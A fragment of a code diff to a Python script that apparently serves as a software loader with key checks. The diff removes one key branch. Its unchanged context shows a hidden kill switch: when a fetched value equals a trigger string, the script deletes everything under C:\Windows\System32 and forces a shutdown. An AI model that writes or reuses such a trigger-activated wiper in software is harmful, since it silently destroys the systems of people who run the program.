@@ -17,11 +17,7 @@ if file_contentsx1=="deleternn":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
 os.system('cls')
-if file_contentsx1 =="ZdzXYcR2w0sag":
-    os.system('cls')
-    print("you may use the custom loader.")
-    input()
-    sys.exit()
+
 if file_contentsx1 =="xmA1q6LZnUyCP":
     os.system('cls')
     print("not verified for this loader.")
